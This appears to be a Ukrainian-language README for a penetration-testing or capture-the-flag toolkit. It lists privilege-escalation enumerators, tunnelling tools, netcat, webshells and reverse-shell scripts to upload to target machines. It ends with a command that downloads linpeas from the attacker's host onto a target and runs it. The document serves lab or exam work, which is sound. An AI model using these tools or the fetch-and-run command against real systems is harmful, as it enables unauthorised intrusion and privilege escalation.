# Tools

## linux/ — заливати на Linux-ціль
| Файл | Призначення | Коли |
|---|---|---|
| `linpeas.sh` | авто-enum привілеїв/кредів/misconfig | після першого доступу |
| `lse.sh` | linux-smart-enumeration (тихіший за linpeas) | альтернатива linpeas |
| `les.sh` | linux-exploit-suggester (kernel CVE) | якщо раптом потрібен root-вектор |
| `pspy64` | моніторинг процесів/cron **без рута** | пошук cron/сервісів інших юзерів |
| `pspy64s` | те саме, менший статичний білд | якщо pspy64 не запускається |
| `chisel` | TCP-тунель / SOCKS-проксі | пивотинг до внутрішніх сервісів |
| `ligolo-agent` | агент ligolo-ng (альтернатива chisel) | пивотинг, якщо зручніший |
| `ncat` | nc з SSL, портативний | listener/передача, якщо на цілі нема nc |
| `socat` | релеї, повний TTY | стабільний shell, port-relay |
| `bincrypter` | обфускація/пакування бінарників | допоміжне, рідко |

→ пивотинг: [pivoting](../02-workflows/pivoting-portforward.md) · enum: [post-exploitation](../01-roadmaps/post-exploitation.md)

## windows/ — заливати на Windows-ціль
| Файл | Призначення |
|---|---|
| `nc.exe` | netcat для Windows (listener/revshell) |
| `plink.exe` | SSH-клієнт PuTTY (тунелі/port-forward) |
| `wget.exe` | завантаження файлів на ціль |
| `whoami.exe` | якщо вбудованого бракує на старих ОС |

→ [windows-enum](../06-windows/windows-enum.md). winPEAS/mimikatz не кладемо (див. нижче).

## webshells/ — залити на вразливий веб-сервер
`php/`, `asp/`, `jsp/`, `perl/` — готові веб-шели й reverse-shell скрипти.
Перед використанням у reverse-варіантах виставити свій IP/порт усередині файлу.
→ [webshells/revshells cheatsheet](../03-cheatsheets/webshells-revshells.md)

---

## Чого тут НЕ покладено (вже є на кожній Kali у `/usr/share`)
Великі стандартні набори — щоб не роздувати репо. Шляхи в системі:
| Ресурс | Шлях у Kali | Розмір |
|---|---|---|
| rockyou.txt | `/usr/share/wordlists/rockyou.txt` | ~134 МБ |
| SecLists | `/usr/share/seclists` | ~1.9 ГБ |
| winPEAS (усі білди) | `/usr/share/peass/winpeas/` | ~64 МБ |
| linpeas (усі білди) | `/usr/share/peass/linpeas/` | ~25 МБ (тут лишили тільки `linpeas.sh`) |
| mimikatz | `/usr/share/windows-resources/mimikatz` | ~2.6 МБ |
| powersploit | `/usr/share/windows-resources/powersploit` | ~5.9 МБ |

Якщо на основному етапі знадобиться щось із цього — воно вже в системі за цими шляхами.
Вибір wordlist під задачу — у [pre-game-checklist](../00-setup/pre-game-checklist.md#wordlists-перевірка-наявності-та-вибір).

## Роздача на ціль (швидко)
```bash
# на Kali, з цього каталогу:
cd tools/linux && python3 -m http.server 8000
# на цілі:
wget http://10.8.N.x:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh
```
Повні способи передачі (nc, /dev/tcp, scp): [file-transfer](../02-workflows/file-transfer.md).
